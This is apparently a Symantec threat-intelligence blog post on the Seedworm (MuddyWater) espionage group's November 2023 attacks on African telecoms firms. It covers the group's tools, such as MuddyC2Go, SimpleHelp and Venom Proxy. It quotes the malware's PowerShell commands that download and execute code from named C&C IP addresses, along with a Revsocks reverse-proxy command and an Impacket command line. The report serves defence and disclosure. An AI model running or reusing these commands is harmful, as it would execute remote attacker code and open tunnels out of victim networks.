Seedworm: Iranian Hackers Target Telecoms Orgs in
North and East Africa

symantec-enterprise-blogs.security.com/blogs/threat-intelligence/iran-apt-seedworm-africa-telecoms

Iranian espionage group Seedworm (aka Muddywater) has been targeting organizations
operating in the telecommunications sector in Egypt, Sudan, and Tanzania. 

Seedworm has been active since at least 2017, and has targeted organizations in many
countries, though it is most strongly associated with attacks on organizations in the Middle
East. It has been publicly stated that Seedworm is a cyberespionage group that is believed
to be a subordinate part of Iran’s Ministry of Intelligence and Security (MOIS).

The attackers used a variety of tools in this activity, which occurred in November 2023,
including leveraging the MuddyC2Go infrastructure, which was recently discovered and
documented by Deep Instinct. Researchers on Symantec’s Threat Hunter Team, part of
Broadcom, found a MuddyC2Go PowerShell launcher in the activity we investigated.

The attackers also use the SimpleHelp remote access tool and Venom Proxy, which have
previously been associated with Seedworm activity, as well as using a custom keylogging
tool, and other publicly available and living-off-the-land tools.

Attack Chain

The attacks in this campaign occurred in November 2023. Most of the activity we observed
occurred on one telecommunications organization. The first evidence of malicious activity
was some PowerShell executions related to the MuddyC2Go backdoor.

A MuddyC2Go launcher named “vcruntime140.dll” was saved in the folder
“csidl_common_appdata\javax”, which seems to have been sideloaded by jabswitch.exe.
Jabswitch.exe is a legitimate Java Platform SE 8 executable.

The MuddyC2Go launcher executed the following PowerShell code to connect to its
command-and-control (C&C) server:

tppmjyfiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp;$tppmjy
fiqnqptrfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp="tppmjyfiqnqp
trfnhhfeczjgjicgegydytihegfwldobtvicmthuqurdynllcnjworqepp";$uri
="http://95.164.38.99:443/HR5rOv8enEKonD4a0UdeGXD3xtxWix2Nf";$response =
Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex
$response.Content;

It appears that the variables at the beginning of the code are there for the purposes of
attempting to bypass detection by security software, as they are unused and not relevant.

Right after this execution, attackers launched the MuddyC2Go malware using a scheduled
task that had previously been created:

"CSIDL_SYSTEM\schtasks.exe" /run /tn "Microsoft\Windows\JavaX\Java Autorun"

The attackers also used some typical commands related to the Impacket WMIExec hacktool:

cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1698662615.0451615 2>&1

The SimpleHelp remote access tool was also leveraged, connecting to the 146.70.124[.]102
C&C server. Further PowerShell stager execution also occurred, while the attacker also
executed the Revsocks tool:

CSIDL_COMMON_APPDATA\do.exe -co 94.131.3.160:443 -pa super -q

The attackers also used a second legitimate remote access tool, AnyDesk, which was
deployed on the same computer as Revsocks and SimpleHelp, while PowerShell executions
related to MuddyC2Go also occurred on the same machine: 

$uri ="http://45.150.64.39:443/HJ3ytbqpne2tsJTEJi2D8s0hWo172A0aT";$response =
Invoke-WebRequest -Uri $uri -Method GET -ErrorAction Stop -usebasicparsing;iex
$response.Content;

Notably, this organization is believed to have previously been infiltrated by Seedworm earlier
in 2023. The primary activity of note during that intrusion was extensive use of SimpleHelp to
carry out a variety of activity, including: 

Launching PowerShell
Launching a proxy tool
Dumping SAM hives
Using WMI to get drive info
Installing the JumpCloud remote access software
Delivering proxy tools, a suspected LSASS dump tool, and a port scanner.

During that intrusion, it’s believed the attackers used WMI to launch the SimpleHelp installer
on the victim network. At the time, this activity couldn’t be definitively linked to Seedworm,
but this subsequent activity appears to show that the earlier activity was carried out by the
same group of attackers.

In another telecommunications and media company targeted by the attackers, multiple
incidents of SimpleHelp were used to connect to known Seedworm infrastructure. A custom
build of the Venom Proxy hacktool was also executed on this network, as well as the new
custom keylogger used by the attackers in this activity.

In the third organization targeted, Venom Proxy was also used, in addition to AnyDesk and
suspicious Windows Scripting Files (WSF) that have been associated with Seedworm activity
in the past. 

Toolset

The most interesting part of the toolset used in this activity is probably the presence of the
MuddyC2Go launcher, which was sideloaded by jabswitch.exe.

The malware reads the C&C URL from the Windows registry value “End” stored inside the
key “HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip”. The URL path is read from the
“Status” value in the same aforementioned key.

Lastly, the MuddyC2GO launcher executes the following PowerShell command to contact its
C&C server and execute the PowerShell code received:

powershell.exe -c $uri ='{C2_URI}';$response = Invoke-WebRequest -
UseBasicParsing -Uri $uri -Method GET -ErrorAction Stop;Write-Output
$response.Content;iex $response.Content;

The MuddyC2Go framework was first publicly written about in a blog published by Deep
Instinct researchers on November 8, 2023. That blog documented its use in attacks on
organizations in countries in the Middle East. The researchers said the framework may have
been used by Seedworm since 2020. They also said that the framework, which is written in
Go, has replaced Seedworm’s previous PhonyC2 C&C infrastructure. This replacement
appears to have occurred after the PhonyC2 source code was leaked earlier in 2023. The full
capabilities of MuddyC2Go are not yet known, but the executable contains an embedded
PowerShell script that automatically connects to Seedworm’s C&C server, which eliminates
the need for manual execution by an operator and gives the attackers remote access to a
victim machine. Deep Instinct said it was able to link MuddyC2Go to attacks dating back to
2020 due to the unique URL patterns generated by the framework. It also said that the
MuddyC2Go servers it observed were hosted at “Stark Industries”, which is a VPS provider
that is known to host malicious activity. 

Other tools of note used in this activity included SimpleHelp, which is a legitimate remote
device control and management tool, for persistence on victim machines. SimpleHelp is
believed to have been used in attacks carried out by Seedworm since at least July 2022.
Once installed on a victim device, SimpleHelp can constantly run as a system service, which
makes it possible for attackers to gain access to the user’s device at any point in time, even
after a reboot. SimpleHelp also allows attackers to execute commands on a device with
administrator privileges. SimpleHelp is now strongly associated with Seedworm activity and
the tool is installed on several of Seedworm’s servers.

Venom Proxy is a publicly available tool that is described as “a multi-hop proxy tool
developed for penetration testers.” It is written in Go. It can be used to easily proxy network
traffic to a multi-layer intranet, and easily manage intranet nodes. It has been associated with
Seedworm since at least mid-2022, with Microsoft describing it as Seedworm’s “tool of
choice” in an August 2022 blog. Seedworm tends to use a custom build of Venom Proxy in
its activity. 

Other tools used in this activity include:

Revsocks - A cross-platform SOCKS5 proxy server program/library written in C that
can also reverse itself over a firewall.
AnyDesk - A legitimate remote desktop application. It and similar tools are often used
by attackers to obtain remote access to computers on a network. 
PowerShell - Seedworm makes heavy use of PowerShell, as well as PowerShell-
based tools and scripts in its attacks. PowerShell is a Microsoft scripting tool that can
be used to run commands, download payloads, traverse compromised networks, and
carry out reconnaissance.
Custom keylogger

Conclusion

Seedworm has long had an interest in telecommunications organizations, as do many
groups engaged in cyberespionage activities. However, its strong focus on African
organizations in this campaign is notable as, while it has been known to target organizations
in Africa in the past, it does generally primarily focus on organizations in countries in the
Middle East. That one of the victim organizations in this campaign is based in Egypt is also
of note given Egypt’s proximity to Israel, a frequent target of Seedworm. 

Seedworm appears to remain focused on using a wide array of living-off-the-land and
publicly available tools in its attack chains, no doubt in an effort to remain undetected on
victim networks for as long as possible. However, its recent more wide adoption of new C&C
infrastructure in the form of MuddyC2Go is notable and shows that the group continues to
innovate and develop its toolset when required in order to keep its activity under the radar.
While the group uses a lot of living-off-the-land and publicly available tools, it is also capable
of developing its own custom tools, such as the custom build of Venom Proxy and the
custom keylogger used in this campaign. The group still makes heavy use of PowerShell and
PowerShell-related tools and scripts, underlining the need for organizations to be aware of
suspicious use of PowerShell on their networks. 

The activity observed by Symantec’s Threat Hunter Team took place in November 2023,
showing that Seedworm is very much a currently active threat faced by organizations that
may be of strategic interest to Iranian threat actors.
